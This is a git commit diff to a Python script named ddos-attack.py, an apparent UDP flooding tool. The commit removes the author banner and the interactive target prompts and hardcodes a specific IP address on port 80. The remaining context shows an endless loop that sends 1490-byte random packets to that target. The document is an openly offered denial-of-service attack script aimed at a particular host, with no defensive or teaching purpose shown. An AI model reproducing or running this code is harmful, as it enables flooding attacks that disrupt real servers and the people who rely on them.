4b7d91361cb9d8efb20ecdaf3aaa3dfad9b87b58
botsarefuture <101255718+botsarefuture@users.noreply.github.com>
2023-02-15 17:45:31 +0200

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -18,28 +18,10 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = "95.217.20.194"
+port = 80
 
 os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
